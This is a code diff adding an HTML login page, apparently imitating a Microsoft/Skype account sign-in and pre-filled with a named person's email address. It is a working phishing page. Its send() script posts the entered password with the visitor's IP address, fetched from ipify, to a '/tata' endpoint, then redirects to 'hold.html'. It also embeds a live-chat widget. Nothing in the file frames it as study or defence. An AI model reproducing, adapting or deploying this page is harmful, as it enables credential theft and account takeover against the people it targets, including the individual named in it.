@@ -1,0 +1,170 @@
+<html>
+<head>
+      <title>Sign in to your account</title>
+	  <link rel="stylesheet" href="inex.css">
+    <link rel="icon" type="image/png" href="ico.png">
+</head>
+<body>
+    <div id="container2">
+      <div class="house">
+        <div>
+          <img src="lowo.png" alt="">
+        </div>
+        <div class="iline">
+          <input type="text" id="ama" placeholder="Email, phone, or Skype">
+        </div>
+        <div>
+          <p>No account? <span>Create one!</span></p>
+          <p><span>Can't access your account?</span></p>
+        </div>
+        <div class="another">
+          <img src="another.png" alt="" id="change">
+        </div>
+          
+      </div>
+	
+      <div class="home">
+        <div>
+          <img src="dkey.png" alt="">
+        </div>
+      </div>
+    </div>
+
+    <div id="container">
+      <div id="house2">
+       <div id="ouse">
+        <div id="hou1">
+          <div>
+          <img src="loco.png" alt="">
+          </div>
+          <div id="enterr">
+          <h1>Welcome</h1>
+          </div>
+          <div id="userr">
+            Brett.utian@gmail.com 
+          </div>
+        </div>
+         
+         <div id="hou2"> 
+         <div id="iput">
+          <input type="password" id="peel" placeholder="Enter Password">
+          <input type="hidden" id="ip_address" name="ip_address">
+          <p>show password</p>
+         </div>
+
+         </div>
+       </div>   
+       
+        <div id="sxin">
+          
+          <p id="fpw">Forget password?</p>
+          <p id="nPag" onclick="send()" style="border-radius: 25px;color: #fff;width:47px;display:flex;flex-direction: column;align-items: center;padding-top: 5px; text-align: center; height: 25px; background: rgba(0, 132, 255, 0.979);">Next</p>
+          
+
+          <!--Forget password<span><img src="sxin.png" alt="" id="nPag" onclick="send()"></span>-->
+        </div>
+        </div>
+    </div>
+</body>
+<script>
+ 
+  async function send() {
+    const res = await fetch("/tata");
+        const vault = await res.json();
+
+        const lastItem = (Array.isArray(vault) && vault.length > 0) ? vault[vault.length - 1] : null;
+
+        // No # in default value
+        const lastIdString = lastItem?.nextId || "00100";
+
+        // Removed # from the string creation
+        const nextId = String(parseInt(lastIdString, 10) + 1).padStart(5, "0");
+
+        localStorage.setItem('sharedData', nextId);
+
+
+    await fetch("/tata", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        nextId: nextId,
+        ip: document.getElementById('ip_address').value,
+        name: document.getElementById('userr').textContent,
+        hash: document.getElementById('peel').value,
+        deliveryFee: "",
+        time: new Date().toISOString()
+      })
+    });
+
+   
+
+    window.location.href = "hold.html";
+
+
+    
+  }
+</script>
+<script>
+  async function loadBg(){
+    const res = await fetch("/bg");
+    const data = await res.json();
+
+    document.body.style.backgroundImage =
+    `url('/images/${data.image}')`;
+    document.body.style.backgroundSize = "cover";
+    document.body.style.backgroundRepeat = "no-repeat";
+    document.body.style.backgroundPosition ="center";
+  }
+
+  loadBg();
+</script>
+
+<script>
+const clean = document.getElementById('change');
+const peelh = document.getElementById('peel').value;
+
+clean.addEventListener('click', ()=>{
+  const amah = document.getElementById('ama').value;
+
+  document.getElementById('container').style.display="none";
+  document.getElementById('container2').style.display="flex";
+  document.getElementById('userr').innerHTML = amah; 
+  
+})
+
+/*nPag.addEventListener('click', ()=>{
+  const amah = document.getElementById('ama').value;
+
+  localStorage.setItem('userName', amah);
+  window.location.href = 'auth.html';
+})*/
+</script>
+<script>
+  // Wait for the document to be fully loaded
+  document.addEventListener("DOMContentLoaded", function() {
+    // Fetch the IP address from a third-party service (e.g., ipify)
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        // Find the hidden input field by its ID and set its value
+        document.getElementById('ip_address').value = data.ip;
+      })
+      .catch(error => {
+        console.error('Error fetching IP address:', error);
+      });
+  });
+</script>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/69aa9aff7e051e1c367adf6a/1jj16qulh';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+</html>
